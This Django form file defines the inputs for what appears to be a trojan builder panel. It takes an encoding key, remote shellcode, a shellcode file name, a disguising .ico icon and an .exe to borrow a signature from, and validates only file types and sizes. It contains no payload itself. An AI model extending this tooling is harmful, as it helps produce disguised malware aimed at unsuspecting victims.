from django import forms
from .models import TrojanList

class TrojanListForm(forms.ModelForm):
    class Meta:
        model = TrojanList
        fields = ['chosen_plan', 'encode_key', 'shellcode_remote', 'notes', 'shellcode_file_name', 'icon_file', 'signature_file']

    def clean_icon_file(self):
        icon_file = self.cleaned_data.get('icon_file')
        if icon_file:
            ext = icon_file.name.split('.')[-1].lower()
            if ext != 'ico':
                raise forms.ValidationError("图标仅允许.ico文件！")
            # 设定文件大小限制，例如5MB（5 * 1024 * 1024 字节）
            MAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB
            if icon_file.size > MAX_FILE_SIZE:
                raise forms.ValidationError("图标文件大小不得超过5MB！")
        return icon_file

    def clean_signature_file(self):
        signature_file = self.cleaned_data.get('signature_file')
        if signature_file:
            ext = signature_file.name.split('.')[-1].lower()
            if ext != 'exe':
                raise forms.ValidationError("签名仅允许.exe文件！")
            # 设定文件大小限制，例如5MB（5 * 1024 * 1024 字节）
            MAX_FILE_SIZE = 100 * 1024 * 1024  # 5MB
            if signature_file.size > MAX_FILE_SIZE:
                raise forms.ValidationError("签名文件不得超过100MB！")
        return signature_file